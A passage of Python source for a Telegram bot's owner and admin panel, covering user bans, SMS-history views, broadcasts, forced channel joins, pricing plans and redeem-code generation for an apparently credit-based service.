            f"{em(EMOJI_SHIELD, '🛡')} <b>Admin bana diya!</b>", parse_mode="HTML")
    except: pass


@R.callback_query(F.data.startswith("owner:admins:del:"))
async def owner_admins_del(cq: CallbackQuery, state: FSMContext):
    d = load(); uid = cq.from_user.id
    did = int(cq.data.split(":")[-1])
    if not is_owner(uid, d):
        await cq.answer("🚫", show_alert=True); return
    if did in d.get("admins", []):
        d["admins"].remove(did)
        save_now(d)
        await cq.answer("🗑 removed")
    await owner_admins_menu(cq, state)


@R.callback_query(F.data.in_({"owner:free:on", "owner:free:off"}))
async def owner_free_toggle(cq: CallbackQuery, state: FSMContext):
    await state.clear()
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫", show_alert=True); return
    d["free_mode"] = (cq.data == "owner:free:on")
    save_now(d)
    d = load()
    await cq.answer("🟢 free mode ON" if d["free_mode"] else "🔴 approval required", show_alert=True)
    try:
        await safe_edit(cq.message, owner_panel_text(d),
                        reply_markup=owner_home_kb_v2(d), parse_mode="HTML")
    except TelegramBadRequest: pass


# ═══════════════════════════════════════════════════════════════════════
# USER LIST / DETAIL / RECORD
# ═══════════════════════════════════════════════════════════════════════
@R.callback_query(F.data.in_({"owner:users:list", "admin:users:list"}))
async def panel_users_list(cq: CallbackQuery, state: FSMContext):
    d = load(); uid = cq.from_user.id
    prefix = "owner" if is_owner(uid, d) else "admin"
    if not is_admin(uid, d):
        await cq.answer("🚫", show_alert=True); return
    text, markup = users_list_kb_v2(d, prefix, 0)
    await safe_edit(cq.message, text, reply_markup=markup, parse_mode="HTML")


@R.callback_query(F.data.regexp(r"^(owner|admin):users:pg:(\d+)(:.+)?$"))
async def panel_users_page(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_admin(cq.from_user.id, d):
        await cq.answer("🚫", show_alert=True); return
    parts = cq.data.split(":")
    prefix = parts[0]
    page = int(parts[3])
    query = parts[4] if len(parts) > 4 else ""
    if query == "_": query = ""
    text, markup = users_list_kb_v2(d, prefix, page, query)
    await safe_edit(cq.message, text, reply_markup=markup, parse_mode="HTML")


@R.callback_query(F.data.in_({"owner:users:search", "admin:users:search"}))
async def users_search_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_admin(cq.from_user.id, d):
        await cq.answer("🚫", show_alert=True); return
    prefix = "owner" if is_owner(cq.from_user.id, d) else "admin"
    await state.update_data(search_prefix=prefix)
    await state.set_state(S.users_search)
    await safe_edit(cq.message,
        f"🔍 <b>Find User</b>\n\nUID ya name ka part bhejo:",
        reply_markup=kb([("❌ ᴄᴀɴᴄᴇʟ", f"{prefix}:users:list")]),
        parse_mode="HTML")


@R.message(S.users_search)
async def users_search_received(msg: Message, state: FSMContext):
    d = load()
    if not is_admin(msg.from_user.id, d):
        await state.clear(); return
    data = await state.get_data()
    prefix = data.get("search_prefix", "owner")
    q = msg.text.strip()
    await state.clear()
    text, markup = users_list_kb_v2(d, prefix, 0, query=q)
    await msg.answer(text, reply_markup=markup, parse_mode="HTML")


@R.callback_query(F.data.startswith("u:view:"))
async def user_view(cq: CallbackQuery, state: FSMContext):
    await state.clear()
    d = load()
    if not is_admin(cq.from_user.id, d):
        await cq.answer("🚫", show_alert=True); return
    parts = cq.data.split(":")
    target = int(parts[2])
    back_prefix = parts[3]
    back_page = int(parts[4]) if len(parts) > 4 else 0
    await safe_edit(cq.message, user_detail_text(target, d),
                    reply_markup=user_detail_kb(target, d,
                        f"{back_prefix}:users:pg:{back_page}:_"),
                    parse_mode="HTML")


@R.callback_query(F.data.startswith("u:ban:"))
async def user_ban(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_admin(cq.from_user.id, d):
        await cq.answer("🚫", show_alert=True); return
    uid = int(cq.data.split(":")[2])
    if is_admin(uid, d):
        await cq.answer("❌ admin ko ban nahi kar sakte", show_alert=True); return
    if uid not in d["banned"]:
        d["banned"].append(uid); save_now(d)
    await cq.answer(f"🚫 {uid} banned")
    await safe_edit(cq.message, user_detail_text(uid, load()),
                    reply_markup=user_detail_kb(uid, load(), "owner:users:list"),
                    parse_mode="HTML")


@R.callback_query(F.data.startswith("u:unban:"))
async def user_unban(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_admin(cq.from_user.id, d):
        await cq.answer("🚫", show_alert=True); return
    uid = int(cq.data.split(":")[2])
    if uid in d["banned"]:
        d["banned"].remove(uid); save_now(d)
    await cq.answer(f"✅ {uid} unbanned")
    await safe_edit(cq.message, user_detail_text(uid, load()),
                    reply_markup=user_detail_kb(uid, load(), "owner:users:list"),
                    parse_mode="HTML")


@R.callback_query(F.data.startswith("u:hist:"))
async def user_hist(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_admin(cq.from_user.id, d):
        await cq.answer("🚫", show_alert=True); return
    uid = int(cq.data.split(":")[2])
    hist = d.get("sms_history", {}).get(str(uid), [])[-15:]
    if not hist:
        text = f"📜 <b>SMS History</b> · <code>{uid}</code>\n\n<i>empty</i>"
    else:
        lines = [f"📜 <b>SMS History</b> · <code>{uid}</code>\n"]
        for h in reversed(hist):
            icon = "✅" if h.get("status") == "sent" else "⏳" if h.get("status") == "stopped" else "❌"
            lines.append(f"{icon} {fmt_time(h.get('timestamp', 0))} · "
                        f"<code>{mask_number(h.get('number', '?'))}</code>")
        text = "\n".join(lines)
    await safe_edit(cq.message, text,
                    reply_markup=kb([("ʙᴀᴄᴋ", f"u:view:{uid}:owner:0")]),
                    parse_mode="HTML")


@R.callback_query(F.data.startswith("u:record:"))
async def user_record(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_admin(cq.from_user.id, d):
        await cq.answer("🚫", show_alert=True); return
    uid = int(cq.data.split(":")[2])
    await safe_edit(cq.message, user_record_text(uid, d),
                    reply_markup=user_record_kb(uid), parse_mode="HTML")


@R.callback_query(F.data.startswith("u:activity:"))
async def user_activity_view(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_admin(cq.from_user.id, d):
        await cq.answer("🚫", show_alert=True); return
    uid = int(cq.data.split(":")[2])
    act = [a for a in d.get("activity_log", []) if a.get("uid") == uid][-25:]
    if not act:
        text = f"📊 <b>Activity</b> · <code>{uid}</code>\n\n<i>empty</i>"
    else:
        lines = [f"📊 <b>Activity</b> · <code>{uid}</code>\n"]
        for a in reversed(act):
            lines.append(f"· {fmt_time(a['timestamp'])}\n"
                        f"   <b>{escape(a['action'])}</b> {escape(a.get('details', '')[:50])}")
        text = "\n".join(lines)
    await safe_edit(cq.message, text,
                    reply_markup=kb([("ʙᴀᴄᴋ", f"u:record:{uid}")]),
                    parse_mode="HTML")


# ═══════════════════════════════════════════════════════════════════════
# BAN / UNBAN / BROADCAST (legacy flows)
# ═══════════════════════════════════════════════════════════════════════
@R.callback_query(F.data.in_({"owner:ban", "admin:ban"}))
async def panel_ban_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_admin(cq.from_user.id, d):
        await cq.answer("🚫", show_alert=True); return
    await state.set_state(S.ban_user)
    back = "owner:home" if is_owner(cq.from_user.id, d) else "admin:home"
    await safe_edit(cq.message,
        f"{em(EMOJI_CROSS, '🚫')} <b>Ban User</b>\n\nUser ID bhejo:",
        reply_markup=kb([("❌ ᴄᴀɴᴄᴇʟ", back)]),
        parse_mode="HTML")


@R.message(S.ban_user)
async def panel_ban_done(msg: Message, state: FSMContext):
    d = load(); uid = msg.from_user.id
    if not is_admin(uid, d): await state.clear(); return
    try:
        bid = int(msg.text.strip())
    except:
        await msg.answer("❌ valid ID:", parse_mode="HTML"); return
    if is_owner(bid, d) or is_admin(bid, d):
        await state.clear()
        await msg.answer("❌ admin/owner can't be banned", parse_mode="HTML"); return
    if bid not in d.get("banned", []):
        d.setdefault("banned", []).append(bid)
        save_now(d)
    await state.clear()
    await msg.answer(f"🚫 <b>Banned!</b>\n<code>{bid}</code>",
                    reply_markup=owner_home_kb_v2(d) if is_owner(uid, d) else admin_home_kb_v2(d),
                    parse_mode="HTML")
    try:
        await msg.bot.send_message(bid,
            f"{em(EMOJI_CROSS, '🚫')} Banned.", parse_mode="HTML")
    except: pass


@R.callback_query(F.data.in_({"owner:unban:menu", "admin:unban:menu"}))
async def panel_unban_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_admin(cq.from_user.id, d):
        await cq.answer("🚫", show_alert=True); return
    banned = d.get("banned", [])
    if not banned:
        await cq.answer("✅ none banned", show_alert=True); return
    prefix = "owner" if is_owner(cq.from_user.id, d) else "admin"
    await safe_edit(cq.message,
        f"🔓 <b>Unban</b>\n\nBanned: <b>{len(banned)}</b>",
        reply_markup=unban_menu_kb(d, prefix), parse_mode="HTML")


@R.callback_query(F.data.regexp(r"^(owner|admin):unban:do:(\d+)$"))
async def panel_unban_do(cq: CallbackQuery, state: FSMContext):
    d = load(); uid = cq.from_user.id
    if not is_admin(uid, d):
        await cq.answer("🚫", show_alert=True); return
    bid = int(cq.data.split(":")[-1])
    if bid in d.get("banned", []):
        d["banned"].remove(bid)
        save_now(d)
    await cq.answer(f"✅ {bid} unbanned", show_alert=True)
    back_text = owner_panel_text(d) if is_owner(uid, d) else admin_panel_text(d)
    back_kb = owner_home_kb_v2(d) if is_owner(uid, d) else admin_home_kb_v2(d)
    await safe_edit(cq.message, back_text, reply_markup=back_kb, parse_mode="HTML")
    try:
        await cq.bot.send_message(bid,
            f"✅ Ban removed. /start", parse_mode="HTML")
    except: pass


@R.callback_query(F.data.in_({"owner:broadcast", "admin:broadcast"}))
async def panel_broadcast_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_admin(cq.from_user.id, d):
        await cq.answer("🚫", show_alert=True); return
    await state.set_state(S.broadcast)
    back = "owner:home" if is_owner(cq.from_user.id, d) else "admin:home"
    await safe_edit(cq.message,
        f"{em(EMOJI_BELL, '📢')} <b>Broadcast</b>\n\nMessage type karo:",
        reply_markup=kb([("❌ ᴄᴀɴᴄᴇʟ", back)]),
        parse_mode="HTML")


@R.message(S.broadcast)
async def panel_broadcast_do(msg: Message, state: FSMContext):
    d = load(); uid = msg.from_user.id
    if not is_admin(uid, d): await state.clear(); return
    await state.clear()
    users = d.get("users", {})
    wait = await msg.answer(f"📤 Broadcasting to <b>{len(users)}</b>...", parse_mode="HTML")
    ok = 0; fail = 0
    for us in users:
        try:
            target = int(us)
            if msg.text:
                await safe_send(msg.bot, target,
                    f"{em(EMOJI_BELL, '📢')} <b>Broadcast</b>\n\n{escape(msg.text)}",
                    parse_mode="HTML")
            else:
                await msg.copy_to(target)
            ok += 1
        except: fail += 1
        await asyncio.sleep(0.05)
    await wait.delete()
    back_kb = owner_home_kb_v2(d) if is_owner(uid, d) else admin_home_kb_v2(d)
    await msg.answer(
        f"✅ <b>Broadcast done!</b>\n\n✅ {ok}\n❌ {fail}",
        reply_markup=back_kb, parse_mode="HTML")


@R.message(Command("broadcastbtn"))
async def cmd_broadcast_btn(msg: Message, state: FSMContext):
    d = load(); uid = msg.from_user.id
    if not is_admin(uid, d):
        await msg.answer("❌ admin only", parse_mode="HTML"); return
    if not msg.reply_to_message:
        await msg.answer(
            f"⭐ Reply to message + type:\n"
            f"<code>/broadcastbtn Button Text | https://example.com | success | EMOJI_ID</code>",
            parse_mode="HTML")
        return
    parts = msg.text.split(maxsplit=1)
    if len(parts) < 2:
        await msg.answer("❌ Provide button details", parse_mode="HTML"); return
    args = [p.strip() for p in parts[1].split("|")]
    if len(args) < 2:
        await msg.answer("❌ Invalid format", parse_mode="HTML"); return
    btext = args[0]; blink = args[1]
    if not (blink.startswith("http://") or blink.startswith("https://") or blink.startswith("tg://")):
        await msg.answer("❌ URL must start with http/tg", parse_mode="HTML"); return
    style = args[2].lower() if len(args) > 2 and args[2] else "primary"
    if style not in ("primary", "success", "danger"): style = "primary"
    eid = args[3] if len(args) > 3 and args[3] else None
    button = btn_url(btext, blink, eid, style=style)
    markup = InlineKeyboardMarkup(inline_keyboard=[[button]])
    rm = msg.reply_to_message
    users = d.get("users", {})
    wait = await msg.answer(f"📤 to {len(users)}...", parse_mode="HTML")
    ok = fail = 0
    for us in users:
        try:
            await msg.bot.copy_message(chat_id=int(us), from_chat_id=rm.chat.id,
                                       message_id=rm.message_id, reply_markup=markup)
            ok += 1
        except: fail += 1
        await asyncio.sleep(0.05)
    await wait.delete()
    back_kb = owner_home_kb_v2(d) if is_owner(uid, d) else admin_home_kb_v2(d)
    await msg.answer(f"✅ {ok}\n❌ {fail}", reply_markup=back_kb, parse_mode="HTML")


# ═══════════════════════════════════════════════════════════════════════
# BROADCAST BUILDER (visual)
# ═══════════════════════════════════════════════════════════════════════
@R.callback_query(F.data == "owner:bcast_builder")
async def bcast_builder_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_admin(cq.from_user.id, d):
        await cq.answer("🚫", show_alert=True); return
    await state.set_state(S.bcast_text)
    await state.update_data(bcast_button=None)
    await safe_edit(cq.message,
        f"{em(EMOJI_BELL, '📢')} <b>Broadcast Builder</b>\n\nMessage type karo:",
        reply_markup=kb([("❌ ᴄᴀɴᴄᴇʟ", "owner:home")]),
        parse_mode="HTML")


@R.message(S.bcast_text)
async def bcast_got_text(msg: Message, state: FSMContext):
    if not is_admin(msg.from_user.id, load()):
        await state.clear(); return
    await state.update_data(bcast_text=msg.text)
    data = await state.get_data()
    await msg.answer(bcast_preview_text(data["bcast_text"], data.get("bcast_button")),
                    reply_markup=bcast_preview_kb(), parse_mode="HTML")


@R.callback_query(F.data == "bcast:addbtn")
async def bcast_add_btn(cq: CallbackQuery, state: FSMContext):
    await state.set_state(S.bcast_button)
    await safe_edit(cq.message,
        f"🔗 <b>Add Button</b>\n\nFormat: <code>Label | https://url</code>",
        reply_markup=kb([("❌ ᴄᴀɴᴄᴇʟ", "bcast:cancel")]),
        parse_mode="HTML")


@R.message(S.bcast_button)
async def bcast_btn_received(msg: Message, state: FSMContext):
    if "|" not in msg.text:
        await msg.answer("❌ format: Label | https://url", parse_mode="HTML"); return
    label, url = [p.strip() for p in msg.text.split("|", 1)]
    if not url.startswith("http"):
        await msg.answer("❌ URL must start with http", parse_mode="HTML"); return
    await state.update_data(bcast_button={"text": label, "url": url})
    data = await state.get_data()
    await msg.answer(bcast_preview_text(data["bcast_text"], data["bcast_button"]),
                    reply_markup=bcast_preview_kb(), parse_mode="HTML")


@R.callback_query(F.data == "bcast:go")
async def bcast_go(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_admin(cq.from_user.id, d):
        await cq.answer("🚫", show_alert=True); return
    data = await state.get_data()
    text = data.get("bcast_text", "")
    button = data.get("bcast_button")
    await state.clear()
    markup = None
    if button:
        markup = InlineKeyboardMarkup(inline_keyboard=[
            [btn_url(button["text"], button["url"], EMOJI_BELL, "🔗", style="primary")]
        ])
    users = list(d.get("users", {}).keys())
    wait = await cq.message.edit_text(f"📤 to {len(users)}...", parse_mode="HTML")
    ok = fail = 0
    for us in users:
        try:
            await safe_send(cq.bot, int(us),
                f"{em(EMOJI_BELL, '📢')} <b>Broadcast</b>\n\n{escape(text)}",
                reply_markup=markup, parse_mode="HTML")
            ok += 1
        except: fail += 1
    await wait.edit_text(
        f"✅ <b>Broadcast complete</b>\n\n✅ {ok}\n❌ {fail}",
        reply_markup=owner_home_kb_v2(load()), parse_mode="HTML")


@R.callback_query(F.data == "bcast:cancel")
async def bcast_cancel(cq: CallbackQuery, state: FSMContext):
    await state.clear()
    await owner_home(cq, state)


# ═══════════════════════════════════════════════════════════════════════
# EXPORT SCRIPT
# ═══════════════════════════════════════════════════════════════════════
@R.callback_query(F.data == "owner:export_script")
async def owner_export_script(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫", show_alert=True); return
    await cq.answer("📤 exporting...")
    try:
        sp = os.path.abspath(__file__)
        if not os.path.exists(sp):
            sp = _DATA_FILE.replace(".json", ".py")
        await cq.message.reply_document(
            document=FSInputFile(sp),
            caption=f"📤 <b>Script Export</b> — <i>{_VERSION}</i>",
            parse_mode="HTML")
    except Exception as e:
        await cq.answer(f"❌ {str(e)[:40]}", show_alert=True)


# ═══════════════════════════════════════════════════════════════════════
# FORCE JOIN SETTINGS
# ═══════════════════════════════════════════════════════════════════════
@R.callback_query(F.data == "owner:fj:menu")
async def owner_fj_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫", show_alert=True); return
    fj = d.get("force_join", {})
    chans = fj.get("channels", [])
    status = "🟢 ON" if fj.get("enabled") else "🔴 OFF"
    text = f"{em(EMOJI_BELL, '🔗')} <b>Force Join</b>\n\nStatus: {status}\nChannels: <b>{len(chans)}</b>\n\n"
    for ch in chans:
        req = "✅ Required" if ch.get("required", True) else "❌ Optional"
        text += f"• {escape(ch.get('title', 'Channel'))} (<code>{ch['id']}</code>)\n  {req} | {escape(ch['link'])}\n\n"
    rows = [
        [btn("ᴀᴅᴅ ᴄʜᴀɴɴᴇʟ", "owner:fj:add", EMOJI_CHECK, "➕", style="success")],
        [btn("ʀᴇᴍᴏᴠᴇ", "owner:fj:remove", EMOJI_CROSS, "🗑", style="danger")],
        [InlineKeyboardButton(
            text=f"🟢 {sc('enable')}" if not fj.get("enabled") else f"🔴 {sc('disable')}",
            callback_data="owner:fj:toggle")],
        [btn("ʙᴀᴄᴋ", "owner:cat:system", EMOJI_GEAR, "🔙")],
    ]
    await safe_edit(cq.message, text,
                    reply_markup=InlineKeyboardMarkup(inline_keyboard=rows),
                    parse_mode="HTML")


@R.callback_query(F.data == "owner:fj:add")
async def owner_fj_add_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫", show_alert=True); return
    await state.set_state(S.fj_add_channel)
    await safe_edit(cq.message,
        f"{em(EMOJI_BELL, '🔗')} <b>Add Force Join</b>\n\n"
        f"step 1/2: Channel/Group ID bhejo:\n<i>Example: -1001234567890</i>",
        reply_markup=kb([("❌ ᴄᴀɴᴄᴇʟ", "owner:fj:menu")]),
        parse_mode="HTML")


@R.message(S.fj_add_channel)
async def owner_fj_add_channel(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d): await state.clear(); return
    try:
        cid = int(msg.text.strip())
    except:
        await msg.answer("❌ valid channel ID:", parse_mode="HTML"); return
    await state.update_data(fj_channel_id=cid)
    await state.set_state(S.fj_add_link)
    await msg.answer("step 2/2: Invite link bhejo:",
                    reply_markup=kb([("❌ ᴄᴀɴᴄᴇʟ", "owner:fj:menu")]),
                    parse_mode="HTML")


@R.message(S.fj_add_link)
async def owner_fj_add_link(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d): await state.clear(); return
    link = msg.text.strip()
    if not link.startswith("http"):
        await msg.answer("❌ must start with https://", parse_mode="HTML"); return
    fsmd = await state.get_data()
    cid = str(fsmd.get("fj_channel_id"))
    try:
        chat = await msg.bot.get_chat(int(cid))
        title = chat.title or "Channel"
    except: title = "Channel"
    chans = d.setdefault("force_join", {}).setdefault("channels", [])
    chans = [c for c in chans if str(c["id"]) != cid]
    chans.append({"id": cid, "link": link, "title": title, "required": True})
    d["force_join"]["channels"] = chans
    save_now(d)
    await state.clear()
    await msg.answer(f"✅ <b>Added!</b>\n\n📢 {escape(title)}\n🔗 {escape(link)}",
                    reply_markup=kb([("ʙᴀᴄᴋ", "owner:fj:menu")]),
                    parse_mode="HTML")


@R.callback_query(F.data == "owner:fj:remove")
async def owner_fj_remove_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫", show_alert=True); return
    chans = d.get("force_join", {}).get("channels", [])
    if not chans:
        await cq.answer("❌ none", show_alert=True); return
    rows = []
    for ch in chans:
        rows.append([btn(ch.get("title", "Channel")[:25],
                         f"owner:fj:del:{ch['id']}", EMOJI_CROSS, "🗑", style="danger")])
    rows.append([btn("ʙᴀᴄᴋ", "owner:fj:menu", EMOJI_GEAR, "🔙")])
    await safe_edit(cq.message, "🗑 <b>Remove Channel</b>\n\nSelect:",
                    reply_markup=InlineKeyboardMarkup(inline_keyboard=rows),
                    parse_mode="HTML")


@R.callback_query(F.data.startswith("owner:fj:del:"))
async def owner_fj_del(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫", show_alert=True); return
    cid = cq.data.split("owner:fj:del:", 1)[1]
    chans = d.get("force_join", {}).get("channels", [])
    d["force_join"]["channels"] = [c for c in chans if str(c["id"]) != cid]
    save_now(d)
    await cq.answer("🗑 removed")
    await owner_fj_menu(cq, state)


@R.callback_query(F.data == "owner:fj:toggle")
async def owner_fj_toggle(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫", show_alert=True); return
    fj = d.setdefault("force_join", {})
    fj["enabled"] = not fj.get("enabled", False)
    save_now(d)
    await cq.answer("ENABLED" if fj["enabled"] else "DISABLED", show_alert=True)
    await owner_fj_menu(cq, state)


# ═══════════════════════════════════════════════════════════════════════
# PRICING
# ═══════════════════════════════════════════════════════════════════════
@R.callback_query(F.data == "owner:pricing:menu")
async def owner_pricing_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫", show_alert=True); return
    plans = d.get("pricing", {}).get("plans", [])
    text = f"💳 <b>Pricing Plans</b>\n\nTotal: <b>{len(plans)}</b>\n\n"
    for i, p in enumerate(plans, 1):
        text += (f"{i}. <b>{escape(p['name'])}</b>\n   💰 {p['price']} "
                f"{p.get('currency', 'INR')} = {p['credits']} credits\n   🔗 {escape(p['payment_link'])}\n\n")
    rows = [
        [btn("ᴀᴅᴅ ᴘʟᴀɴ", "owner:pricing:add", EMOJI_CHECK, "➕", style="success")],
        [btn("ʀᴇᴍᴏᴠᴇ", "owner:pricing:remove", EMOJI_CROSS, "🗑", style="danger")],
        [btn("ʙᴀᴄᴋ", "owner:cat:credits", EMOJI_GEAR, "🔙")],
    ]
    await safe_edit(cq.message, text,
                    reply_markup=InlineKeyboardMarkup(inline_keyboard=rows),
                    parse_mode="HTML")


@R.callback_query(F.data == "owner:pricing:add")
async def owner_pricing_add_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫", show_alert=True); return
    await state.set_state(S.add_plan_name)
    await safe_edit(cq.message,
        f"💳 <b>Add Plan</b>\n\nstep 1/4: Plan name:",
        reply_markup=kb([("❌ ᴄᴀɴᴄᴇʟ", "owner:pricing:menu")]),
        parse_mode="HTML")


@R.message(S.add_plan_name)
async def owner_pricing_name(msg: Message, state: FSMContext):
    if not is_owner(msg.from_user.id, load()): await state.clear(); return
    await state.update_data(plan_name=msg.text.strip())
    await state.set_state(S.add_plan_price)
    await msg.answer("step 2/4: Price (e.g. 50):",
                    reply_markup=kb([("❌ ᴄᴀɴᴄᴇʟ", "owner:pricing:menu")]),
                    parse_mode="HTML")


@R.message(S.add_plan_price)
async def owner_pricing_price(msg: Message, state: FSMContext):
    if not is_owner(msg.from_user.id, load()): await state.clear(); return
    try:
        p = float(msg.text.strip())
        await state.update_data(plan_price=p)
    except:
        await msg.answer("❌ valid price:", parse_mode="HTML"); return
    await state.set_state(S.add_plan_credits)
    await msg.answer("step 3/4: Credits?",
                    reply_markup=kb([("❌ ᴄᴀɴᴄᴇʟ", "owner:pricing:menu")]),
                    parse_mode="HTML")


@R.message(S.add_plan_credits)
async def owner_pricing_credits(msg: Message, state: FSMContext):
    if not is_owner(msg.from_user.id, load()): await state.clear(); return
    try:
        c = int(msg.text.strip())
        await state.update_data(plan_credits=c)
    except:
        await msg.answer("❌ valid number:", parse_mode="HTML"); return
    await state.set_state(S.add_plan_link)
    await msg.answer("step 4/4: Payment link:",
                    reply_markup=kb([("❌ ᴄᴀɴᴄᴇʟ", "owner:pricing:menu")]),
                    parse_mode="HTML")


@R.message(S.add_plan_link)
async def owner_pricing_link(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d): await state.clear(); return
    link = msg.text.strip()
    if not link.startswith("http"):
        await msg.answer("❌ must start with https://", parse_mode="HTML"); return
    fsmd = await state.get_data()
    plan = {
        "id": str(int(time.time())),
        "name": fsmd.get("plan_name", "Plan"),
        "price": fsmd.get("plan_price", 0),
        "credits": fsmd.get("plan_credits", 0),
        "currency": "INR",
        "payment_link": link,
    }
    d.setdefault("pricing", {}).setdefault("plans", []).append(plan)
    save_now(d)
    await state.clear()
    await msg.answer(
        f"✅ <b>Plan Added</b>\n\n📋 {escape(plan['name'])}\n"
        f"💰 {plan['price']} INR = {plan['credits']} credits\n🔗 {escape(link)}",
        reply_markup=kb([("ʙᴀᴄᴋ", "owner:pricing:menu")]),
        parse_mode="HTML")


@R.callback_query(F.data == "owner:pricing:remove")
async def owner_pricing_remove(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫", show_alert=True); return
    plans = d.get("pricing", {}).get("plans", [])
    if not plans:
        await cq.answer("❌ none", show_alert=True); return
    rows = []
    for p in plans:
        rows.append([btn(p['name'][:25], f"owner:pricing:del:{p['id']}",
                         EMOJI_CROSS, "🗑", style="danger")])
    rows.append([btn("ʙᴀᴄᴋ", "owner:pricing:menu", EMOJI_GEAR, "🔙")])
    await safe_edit(cq.message, "🗑 <b>Remove Plan</b>\n\nSelect:",
                    reply_markup=InlineKeyboardMarkup(inline_keyboard=rows),
                    parse_mode="HTML")


@R.callback_query(F.data.startswith("owner:pricing:del:"))
async def owner_pricing_del(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫", show_alert=True); return
    pid = cq.data.split("owner:pricing:del:", 1)[1]
    plans = d.get("pricing", {}).get("plans", [])
    d["pricing"]["plans"] = [p for p in plans if p["id"] != pid]
    save_now(d)
    await cq.answer("🗑 removed")
    await owner_pricing_menu(cq, state)


# ═══════════════════════════════════════════════════════════════════════
# REDEEM CODES
# ═══════════════════════════════════════════════════════════════════════
def do_redeem_code(uid: int, code: str):
    code = code.strip().upper()
    def _r(d):
        codes = d.get("redeem_codes", {})
        if code not in codes: return ("invalid", 0)
        cd = codes[code]
        if cd.get("uses_left", 0) <= 0: return ("expired", 0)
        if uid in cd.get("used_by", []): return ("used", 0)
        cr = cd["credits"]
        add_credits(uid, cr, d)
        cd["uses_left"] = cd.get("uses_left", 1) - 1
        cd.setdefault("used_by", []).append(uid)
        return ("ok", cr)
    return atomic_update(_r)


@R.callback_query(F.data == "owner:redeem:menu")
async def owner_redeem_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫", show_alert=True); return
    codes = d.get("redeem_codes", {})
    text = f"🎁 <b>Redeem Codes</b>\n\nTotal: <b>{len(codes)}</b>\n\n"
    for code, data in list(codes.items())[:10]:
        status = "✅ Active" if data.get("uses_left", 0) > 0 else "❌ Expired"
        text += f"<code>{code}</code> — 💰{data['credits']} — {status} ({data.get('uses_left', 0)} left)\n"
    rows = [
        [btn("ɢᴇɴᴇʀᴀᴛᴇ", "owner:redeem:gen", EMOJI_CHECK, "➕", style="success")],
        [btn("ᴅᴇʟᴇᴛᴇ", "owner:redeem:del", EMOJI_CROSS, "🗑", style="danger")],
        [btn("ʀᴇᴍᴏᴠᴇ ᴄʀᴇᴅɪᴛs", "owner:redeem:remove_credits:menu", EMOJI_MONEY, "💸", style="danger")],
        [btn("ʙᴀᴄᴋ", "owner:cat:credits", EMOJI_GEAR, "🔙")],
    ]
    await safe_edit(cq.message, text,
                    reply_markup=InlineKeyboardMarkup(inline_keyboard=rows),
                    parse_mode="HTML")


@R.callback_query(F.data == "owner:redeem:gen")
async def owner_redeem_gen_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫", show_alert=True); return
    await state.set_state(S.gen_redeem_credits)
    await safe_edit(cq.message,
        f"🎁 <b>Generate Code</b>\n\nstep 1/2: Credits?",
        reply_markup=kb([("❌ ᴄᴀɴᴄᴇʟ", "owner:redeem:menu")]),
        parse_mode="HTML")


@R.message(S.gen_redeem_credits)
async def owner_redeem_credits(msg: Message, state: FSMContext):
    if not is_owner(msg.from_user.id, load()): await state.clear(); return
    try:
        c = int(msg.text.strip())
        await state.update_data(gen_credits=c)
    except:
        await msg.answer("❌ valid number:", parse_mode="HTML"); return
    await state.set_state(S.gen_redeem_uses)
    await msg.answer("step 2/2: Max uses?",
                    reply_markup=kb([("❌ ᴄᴀɴᴄᴇʟ", "owner:redeem:menu")]),
                    parse_mode="HTML")


@R.message(S.gen_redeem_uses)
async def owner_redeem_uses(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d): await state.clear(); return
    try:
        u = int(msg.text.strip())
        if u < 1: raise ValueError
    except:
        await msg.answer("❌ valid (>=1):", parse_mode="HTML"); return
    fsmd = await state.get_data()
    c = fsmd.get("gen_credits", 10)
    def _g(dd):
        while True:
            code = "GIFT" + "".join(random.choices(string.ascii_uppercase + string.digits, k=8))
            if code not in dd.get("redeem_codes", {}): break
        dd.setdefault("redeem_codes", {})[code] = {
            "credits": c, "uses_left": u,
            "created_by": msg.from_user.id,
            "created_at": int(time.time()), "used_by": []}
        return code
    code = atomic_update(_g)
    await state.clear()
    me = await msg.bot.get_me()
    rl = f"https://t.me/{me.username}?start=RDM{code}"
    await msg.answer(
        f"🎉 <b>Generated!</b>\n\n🎁 <code>{code}</code>\n"
        f"💰 <b>{c}</b>\n🔢 max uses: <b>{u}</b>\n\n"
